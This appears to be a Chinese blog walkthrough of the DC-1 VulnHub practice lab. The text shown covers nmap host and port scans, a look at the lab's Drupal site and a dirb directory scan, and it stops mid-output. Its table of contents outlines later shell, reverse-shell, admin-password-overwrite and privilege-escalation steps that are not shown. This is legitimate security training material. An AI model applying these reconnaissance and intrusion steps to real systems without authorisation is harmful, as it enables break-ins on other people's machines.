<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x00.官网描述 DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is w"><meta property="og:type" content="article"><meta property="og:title" content="DC-1"><meta property="og:url" content="https://lunamoore.github.io/2020/08/21/DC-1/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x00.官网描述 DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is w"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820192812864.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820193047316.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820200917231.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820201127217.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820204120867.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820233740808.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820234010015.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820234207549.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820234432653.png"><meta property="article:published_time" content="2020-08-20T16:28:55.000Z"><meta property="article:modified_time" content="2020-09-02T09:24:46.839Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="靶机"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/08/21/DC-1/image-20200820192812864.png"><link rel="canonical" href="https://lunamoore.github.io/2020/08/21/DC-1/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>DC-1 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">52</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%AE%98%E7%BD%91%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00.官网描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%8Anmap"><span class="nav-number">2.</span> <span class="nav-text">0x01.上nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%A7%E7%BB%ADnmap%E6%89%AB%E6%8F%8F%E6%9C%8D%E5%8A%A1%E5%8F%8A%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.</span> <span class="nav-text">0x02.继续nmap扫描服务及端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%94%B1%E4%BA%8E%E5%8F%91%E7%8E%B0%E4%BA%8622%E4%B8%8E80%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%80%83%E8%99%91%E7%88%86%E7%A0%B4%E6%88%96%E8%80%85%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B"><span class="nav-number">4.</span> <span class="nav-text">0x03.由于发现了22与80端口，可以考虑爆破或者访问一下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%8F%AF%E4%BB%A5%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">5.</span> <span class="nav-text">0x04.接下来可以对网站进行目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-get-shell"><span class="nav-number">6.</span> <span class="nav-text">0x05.get shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-msf%E4%B8%80%E6%8A%8A%E6%A2%AD%E7%9A%84%E6%88%91%E7%9B%B4%E6%8E%A5msf"><span class="nav-number">6.1.</span> <span class="nav-text">1.msf一把梭的我直接msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%94%B1%E4%BA%8E%E6%98%AF18%E5%B9%B4%E7%9A%84%E6%B4%9E%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%AC%AC%E5%9B%9B%E4%B8%AAAPI%E6%B3%A8%E5%85%A5%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%BF%E5%88%B0meterpreter-shell"><span class="nav-number">6.2.</span> <span class="nav-text">2.由于是18年的洞所以使用第四个API注入，直接拿到meterpreter shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%8C%E5%B9%B6%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83%EF%BC%8C%E9%9C%B8%E7%89%B9%EF%BC%8C%E7%AB%9F%E7%84%B6%E6%B2%A1%E6%9C%89getsystem%F0%9F%99%83"><span class="nav-number">6.3.</span> <span class="nav-text">3.查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%8F%91%E7%8E%B0flag1-txt%EF%BC%8C%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E7%9C%8B"><span class="nav-number">6.4.</span> <span class="nav-text">4.发现flag1.txt，看看有没有权限看</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E7%99%BB%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">7.</span> <span class="nav-text">0x06.登入数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">8.</span> <span class="nav-text">0x07.反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-kali%E5%85%88%E7%9B%91%E5%90%AC6666%E7%AB%AF%E5%8F%A3"><span class="nav-number">8.1.</span> <span class="nav-text">1.kali先监听6666端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-DC1%E6%89%A7%E8%A1%8C"><span class="nav-number">8.2.</span> <span class="nav-text">2.DC1执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8F%8D%E5%BC%B9"><span class="nav-number">8.3.</span> <span class="nav-text">3.反弹</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%86%8D%E6%AC%A1%E7%99%BB%E5%85%A5mysql"><span class="nav-number">9.</span> <span class="nav-text">0x08.再次登入mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">9.1.</span> <span class="nav-text">1.查看数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8drupaldb%EF%BC%8C%E6%9F%A5%E7%9C%8B%E8%A1%A8"><span class="nav-number">9.2.</span> <span class="nav-text">2.使用drupaldb，查看表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9F%A5%E7%9C%8Busers%E8%A1%A8"><span class="nav-number">9.3.</span> <span class="nav-text">3.查看users表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BF%AE%E6%94%B9%E8%A6%86%E7%9B%96admin%E5%AF%86%E7%A0%81"><span class="nav-number">9.4.</span> <span class="nav-text">4.修改覆盖admin密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E7%99%BB%E5%85%A5cms"><span class="nav-number">10.</span> <span class="nav-text">0x09.登入cms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">0x10.提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E6%98%AF%E6%93%A6%E5%B1%81%E8%82%A1%E8%B5%B0%E4%BA%BA%E4%BA%86%EF%BC%8C%E5%B9%B2%E4%B8%8D%E5%8A%A8%E4%BA%86%E3%80%82%E3%80%82%E3%80%82"><span class="nav-number">12.</span> <span class="nav-text">0x11.接下来就是擦屁股走人了，干不动了。。。</span></a></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">52</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/08/21/DC-1/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DC-1</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-08-21 00:28:55" itemprop="dateCreated datePublished" datetime="2020-08-21T00:28:55+08:00">2020-08-21</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-09-02 17:24:46" itemprop="dateModified" datetime="2020-09-02T17:24:46+08:00">2020-09-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/DC/" itemprop="url" rel="index"><span itemprop="name">DC</span></a> </span></span><span id="/2020/08/21/DC-1/" class="post-meta-item leancloud_visitors" data-flag-title="DC-1" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/08/21/DC-1/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/08/21/DC-1/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>28k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>25 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p><p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p><p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p><p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p></blockquote><a id="more"></a><h2 id="0x01-上nmap"><a href="#0x01-上nmap" class="headerlink" title="0x01.上nmap"></a>0x01.上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么3就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ls</span></span><br><span class="line">nmap.sP</span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>可以发现开放了22/80/111/41087端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -A 192.168.1.3 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:19 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36531/tcp6  status</span><br><span class="line">|   100024  1          41087/tcp   status</span><br><span class="line">|   100024  1          48070/udp6  status</span><br><span class="line">|_  100024  1          50997/udp   status</span><br><span class="line">41087/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.80 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.37 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-由于发现了22与80端口，可以考虑爆破或者访问一下"><a href="#0x03-由于发现了22与80端口，可以考虑爆破或者访问一下" class="headerlink" title="0x03.由于发现了22与80端口，可以考虑爆破或者访问一下"></a>0x03.由于发现了22与80端口，可以考虑爆破或者访问一下</h2><p><code>这里先访问一下</code></p><img src="/2020/08/21/DC-1/image-20200820192812864.png"><p><code>感觉像一个cms，先wiki一下，果然这是一个由PHP写的开源cms😜</code></p><img src="/2020/08/21/DC-1/image-20200820193047316.png"><h2 id="0x04-接下来可以对网站进行目录扫描"><a href="#0x04-接下来可以对网站进行目录扫描" class="headerlink" title="0x04.接下来可以对网站进行目录扫描"></a>0x04.接下来可以对网站进行目录扫描</h2><p><code>可以发现robots.txt，此文件用来防爬虫，文件内容一般为不想让人看到的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># dirb http://192.168.1.3 </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Aug 20 07:38:44 2020</span><br><span class="line">URL_BASE: http://192.168.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.3/ ----</span><br><span class="line">+ http://192.168.1.3/0 (CODE:200|SIZE:7564)                           </span><br><span class="line">+ http://192.168.1.3/admin (CODE:403|SIZE:7652)                       </span><br><span class="line">+ http://192.168.1.3/Admin (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/ADMIN (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/batch (CODE:403|SIZE:7787)                         </span><br><span class="line">+ http://192.168.1.3/cgi-bin/ (CODE:403|SIZE:287)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/includes/                             </span><br><span class="line">+ http://192.168.1.3/index.php (CODE:200|SIZE:7564)                     </span><br><span class="line">+ http://192.168.1.3/install.mysql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/install.pgsql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/LICENSE 